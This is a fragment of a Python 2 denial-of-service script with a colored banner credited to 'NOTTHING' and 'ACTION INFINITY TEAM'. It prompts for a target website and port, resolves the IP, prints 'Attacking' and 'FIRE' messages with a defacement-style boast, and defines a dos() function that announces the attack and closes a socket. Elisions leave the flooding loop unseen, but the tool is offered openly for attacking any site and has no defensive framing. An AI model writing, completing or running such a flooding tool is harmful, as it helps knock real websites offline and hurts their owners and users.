...
\033[1;92m        ::::::`:::::;' \033[1;94m /  /   `#                
\033[1;96m|###|#################################|###|
\033[1;96m|!|            By : NOTTHING            |!|
\033[1;96m|!|-------------------------------------|!|
\033[1;96m|!|                 Team                |!|
\033[1;96m|!|-------------------------------------|!|
\033[1;96m|!|         ACTION INFINITY TEAM.       |!|
\033[1;96m|###|#################################|###|
"""
print baner
def restart_program():
...
curdir = os.getcwd()
print ("\033[1;91minput web url \033[1;95m[ex : www.link.com ]")
host=raw_input( "\033[1;94mNOTTHING@root : " )
print ("\033[1;91minput port \033[1;95m[ex : 8080 ]")
port=input("\033[1;94mNOTTHING@root : ")
connect=50000
ip = socket.gethostbyname( host )
print ( "\033[1;91m Attacking \033[1;93m[" + host + "]" )
print ( "\033[1;91m Attack to ip \033[1;93m["+ ip + "]" )
message=("ATTACK OF CYBER & CYBER WARRIORS TEAM & THE BLACK HORSE SYSTEM & FAMILY ATTACK CYBER WAS HERE...")
print ("\033[1;91mFIRE..............................")
def dos():
    #pid = os.fork()
    ...
    print ( "\033[1;92m ...Start Attack The Coffin To [" + ip + "] ...")
    ddos.close()
